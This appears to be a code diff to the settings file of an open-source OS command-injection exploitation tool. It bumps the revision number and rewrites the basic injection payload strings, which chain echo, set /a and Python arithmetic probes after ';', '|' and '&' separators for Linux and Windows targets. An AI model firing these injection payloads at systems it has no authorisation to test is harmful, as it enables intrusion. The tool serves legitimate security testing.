@@ -247,7 +247,7 @@ DESCRIPTION_FULL = "Automated All-in-One OS Command Injection Exploitation Tool"
 DESCRIPTION = "The command injection exploiter"
 AUTHOR  = "Anastasios Stasinopoulos"
 VERSION_NUM = "4.0"
-REVISION = "73"
+REVISION = "74"
 STABLE_RELEASE = False
 VERSION = "v"
 if STABLE_RELEASE:
@@ -323,11 +323,11 @@ RAND_A = random.randint(1,10000)
 RAND_B = random.randint(1,10000)
 CALC_STRING = str(RAND_A) + " %2B " + str(RAND_B)
 BASIC_STRING = "(" + CALC_STRING + ")"
-BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + BASIC_STRING + ")%26%26echo $(" + BASIC_STRING + ")||echo $(" + BASIC_STRING + ")",
-                                   "|set /a " + BASIC_STRING + "&set /a " + BASIC_STRING
+BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + BASIC_STRING + ")%26echo $(" + BASIC_STRING + ")|echo $(" + BASIC_STRING + ")" + RANDOM_STRING_GENERATOR ,
+                                   "|set /a " + BASIC_STRING + "%26set /a " + BASIC_STRING
                                    ]
 ALTER_SHELL_BASIC_STRING = " -c \"print(int(" + CALC_STRING + "))\""
-ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")%26%26echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")||echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")",
+ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")%26echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")|echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")",
                                    "|for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL + " &for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL
                                    ]
 BASIC_COMMAND_INJECTION_RESULT = str(RAND_A + RAND_B)
